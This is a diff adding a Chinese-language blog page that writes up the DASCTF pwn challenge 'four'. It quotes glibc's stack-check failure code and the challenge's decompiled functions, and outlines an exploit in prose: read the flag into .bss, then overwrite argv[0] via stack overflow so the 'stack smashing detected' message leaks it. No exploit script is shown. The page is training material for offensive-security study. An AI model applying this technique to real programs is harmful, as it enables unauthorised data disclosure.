@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="b4nd1t">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/04/24/four/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="DASCTF four">
+<meta property="og:type" content="article">
+<meta property="og:title" content="four">
+<meta property="og:url" content="http://example.com/2023/04/24/four/index.html">
+<meta property="og:site_name" content="b4nd1t&#39;s blog">
+<meta property="og:description" content="DASCTF four">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/1682306006913.png">
+<meta property="og:image" content="http://example.com/img/1682306751178.png">
+<meta property="og:image" content="http://example.com/img/1682306826508.png">
+<meta property="article:published_time" content="2023-04-24T02:46:47.000Z">
+<meta property="article:modified_time" content="2023-04-24T03:27:58.623Z">
+<meta property="article:author" content="b4nd1t">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/1682306006913.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            four -
+        
+        b4nd1t&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[""]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":false,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Just this","subtitle":{"text":["“心中那自由的世界，如此的清澈高远”"],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/7bandit","instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"audios":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.0.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                b4nd1t&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+            
+                <div class="article-title">
+                    <h1 class="article-title-regular">four</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/redefine-avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">b4nd1t</span>
+                            
+                                <span class="author-label"></span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-04-24 10:46:47</span>
+        <span class="mobile">2023-04-24 10:46</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-04-24 11:27:58</span>
+            <span class="mobile">2023-04-24 11:27</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="DASCTF-four"><a href="#DASCTF-four" class="headerlink" title="DASCTF four"></a>DASCTF four</h1><span id="more"></span>
+
+<h2 id="新学到的知识"><a href="#新学到的知识" class="headerlink" title="新学到的知识"></a>新学到的知识</h2><p>在libc2.23中的<code>_stack_chk_fail()</code>函数</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// debug/stack_chk_fail.c</span><br><span class="line">extern char **__libc_argv attribute_hidden;</span><br><span class="line">void</span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// debug/fortify_fail.c</span><br><span class="line">extern char **__libc_argv attribute_hidden;</span><br><span class="line">void</span><br><span class="line">__attribute__ ((noreturn)) internal_function</span><br><span class="line">__fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// sysdeps/posix/libc_fatal.c</span><br><span class="line">/* Abort with an error message.  */</span><br><span class="line">void</span><br><span class="line">__libc_message (int do_abort, const char *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  int fd = -1;</span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">#ifdef FATAL_PREPARE</span><br><span class="line">  FATAL_PREPARE;</span><br><span class="line">#endif</span><br><span class="line">  /* Open a descriptor for /dev/tty unless the user explicitly</span><br><span class="line">     requests errors on standard error.  */</span><br><span class="line">  const char *on_2 = __libc_secure_getenv (&quot;LIBC_FATAL_STDERR_&quot;);</span><br><span class="line">  if (on_2 == NULL || *on_2 == &#x27;\0&#x27;)</span><br><span class="line">    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);</span><br><span class="line">  if (fd == -1)</span><br><span class="line">    fd = STDERR_FILENO;</span><br></pre></td></tr></table></figure></div>
+
+<p>把<code>argv[0]</code>覆盖成flag的地址，再通过栈溢出就可以打印出flag</p>
+<h2 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../img/1682306006913.png"
+                      alt="1682306006913"
+                ></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>main</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v4; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line">  int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v6; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  v4 = 0;</span><br><span class="line">  sub_401458(a1, a2, a3);</span><br><span class="line">  for ( i = 0; i &lt;= 3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;your choice : &quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">    if ( v4 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4014B9();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4013E1();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v4 &gt;= 6 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;error&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( (int)v4 &lt;= 2 )</span><br><span class="line">      sub_400B94();</span><br><span class="line">    if ( v4 == 3 )</span><br><span class="line">      sub_400CA8();</span><br><span class="line">    if ( (int)v4 &gt; 3 )</span><br><span class="line">      sub_40101C();</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>1</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int sub_4014B9()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;You can disclose the libc address, but the error stream will be closed&quot;);</span><br><span class="line">  printf(&quot;address---&gt; %p&quot;, &amp;printf);</span><br><span class="line">  return close(2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>5</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_4013E1()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[8]; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  if ( !dword_60204C )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;);</span><br><span class="line">    read(0, buf, 0x200uLL);</span><br><span class="line">    close(1);</span><br><span class="line">    ++dword_60204C;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br></pre></td></tr></table></figure></div>
+
+<p>sub_400B94</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400B94()</span><br><span class="line">&#123;</span><br><span class="line">  const char *v0; // rax</span><br><span class="line">  char buf; // [rsp+Bh] [rbp-6015h] BYREF</span><br><span class="line">  unsigned int v3; // [rsp+Ch] [rbp-6014h] BYREF</span><br><span class="line">  char v4[24584]; // [rsp+10h] [rbp-6010h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+6018h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  puts(&quot;You can give any value, trust me, there will be no overflow&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v3);</span><br><span class="line">  if ( v3 &gt;= 0x5FF0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;NO OVERFLOW!!!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Actually, this function doesn&#x27;t seem to be useful&quot;);</span><br><span class="line">  sub_400AF7(v4, v3);</span><br><span class="line">  puts(&quot;Really?&quot;);</span><br><span class="line">  read(0, &amp;buf, 1uLL);</span><br><span class="line">  if ( buf == 121 || buf == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (const char *)sub_4009A7(v4);</span><br><span class="line">    printf(&quot;content : %s&quot;, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>3</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400CA8()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+0h] [rbp-260h] BYREF</span><br><span class="line">  unsigned int v2; // [rsp+4h] [rbp-25Ch] BYREF</span><br><span class="line">  unsigned int v3; // [rsp+8h] [rbp-258h] BYREF</span><br><span class="line">  int v4; // [rsp+Ch] [rbp-254h] BYREF</span><br><span class="line">  int i; // [rsp+10h] [rbp-250h]</span><br><span class="line">  int v6; // [rsp+14h] [rbp-24Ch]</span><br><span class="line">  int v7; // [rsp+18h] [rbp-248h]</span><br><span class="line">  int fd; // [rsp+1Ch] [rbp-244h]</span><br><span class="line">  char s1[12]; // [rsp+20h] [rbp-240h] BYREF</span><br><span class="line">  int v10; // [rsp+2Ch] [rbp-234h]</span><br><span class="line">  char dest[32]; // [rsp+30h] [rbp-230h] BYREF</span><br><span class="line">  char buf[256]; // [rsp+50h] [rbp-210h] BYREF</span><br><span class="line">  char s[264]; // [rsp+150h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+258h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  strcpy(s1, &quot;output.txt&quot;);</span><br><span class="line">  s1[11] = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  i = 0;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  printf(&quot;Enter level:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  printf(&quot;Enter mode:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  printf(&quot;Enter X:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v3);</span><br><span class="line">  if ( v1 &gt; 6 || v2 &gt; 4 || v3 &gt;= 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;invalid data!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Enter a string: &quot;);</span><br><span class="line">  sub_400AF7(s, 250LL);</span><br><span class="line">  v7 = strlen(s);</span><br><span class="line">  for ( i = 0; i &lt; v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !(i % (int)v1) || !(i % (int)v2) )</span><br><span class="line">      buf[v6++] = s[i];</span><br><span class="line">    if ( !(i % (int)v3) )</span><br><span class="line">      buf[i] = 64;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;please input filename&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%14s&quot;, s1);</span><br><span class="line">  if ( strncmp(s1, &quot;output.txt&quot;, 0xAuLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    strncpy(s1, &quot;output.txt&quot;, 0xCuLL);</span><br><span class="line">    strncpy(dest, s1, 0xCuLL);</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(dest, 0);</span><br><span class="line">  if ( fd == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;open error!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Do you want to write data?&quot;);</span><br><span class="line">  puts(&quot;1. yes\n2.no&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">  if ( v4 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(fd, buf, 0x100uLL);</span><br><span class="line">    close(fd);</span><br><span class="line">    puts(&quot;Successly!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;OK!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>4</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_40101C()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [rsp+Bh] [rbp-135h]</span><br><span class="line">  int fd; // [rsp+Ch] [rbp-134h]</span><br><span class="line">  int j; // [rsp+10h] [rbp-130h]</span><br><span class="line">  char *i; // [rsp+18h] [rbp-128h]</span><br><span class="line">  char delim[2]; // [rsp+2Ah] [rbp-116h] BYREF</span><br><span class="line">  int v6; // [rsp+2Ch] [rbp-114h]</span><br><span class="line">  char s[8]; // [rsp+30h] [rbp-110h] BYREF</span><br><span class="line">  __int64 v8; // [rsp+38h] [rbp-108h]</span><br><span class="line">  char v9[240]; // [rsp+40h] [rbp-100h] BYREF</span><br><span class="line">  unsigned __int64 v10; // [rsp+138h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  *(_QWORD *)s = 0LL;</span><br><span class="line">  v8 = 0LL;</span><br><span class="line">  memset(v9, 0, sizeof(v9));</span><br><span class="line">  fd = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  strcpy(delim, &quot;&gt;&quot;);</span><br><span class="line">  puts(&quot;info&gt;&gt;&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%256s&quot;, s);</span><br><span class="line">  for ( i = strtok(s, delim); i; i = strtok(0LL, delim) )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( j = 0; i[j]; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( i[j] == &#x27;~&#x27; &amp;&amp; i[j + 1] &gt; &#x27;/&#x27; &amp;&amp; i[j + 1] &lt;= &#x27;9&#x27; )</span><br><span class="line">        fd = i[j + 1] - &#x27;0&#x27;;</span><br><span class="line">      if ( i[j] == &#x27;:&#x27; &amp;&amp; i[j + 1] &amp;&amp; i[j + 2] &amp;&amp; i[j + 3] &amp;&amp; !i[j + 4] )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v6) = i[j + 1];</span><br><span class="line">        BYTE1(v6) = i[j + 2];</span><br><span class="line">        HIWORD(v6) = (unsigned __int8)i[j + 3];</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( i[j] == &#x27;@&#x27; &amp;&amp; i[j + 2] == &#x27;*&#x27; &amp;&amp; i[j + 1] &gt; 0x60 &amp;&amp; i[j + 1] &lt;= &#x27;z&#x27; )</span><br><span class="line">        v1 = i[j + 1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( fd &lt;= 2 || fd &gt; 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;error!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, (void *)((SBYTE1(v6) &lt;&lt; 8) + ((char)v6 &lt;&lt; 16) + SBYTE2(v6)), v1);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>本题的泄露libc没有用，在选项3中可以打开一个文件，文件名地址为dest，如果输入output.txt,就不对dest处进行修改，如果没有输入output.txt,就会把dest处设置成output.txt，而dest处是其他值，所以我们可以先进入<code>sub_400B94</code>函数把栈上布置上很多的flag，这样下次进入选项3的时候就可以让dest处为flag，我们正常输入output.txt就可以打开flag。在选项4中设置读取某个文件的若干字节到一个地址，我们把flag读取到bss段，之后进行溢出覆盖<code>argv[0]</code>为bss段的地址</p>
+<h2 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../img/1682306751178.png"
+                      alt="1682306751178"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../img/1682306826508.png"
+                      alt="1682306826508"
+                ></p>
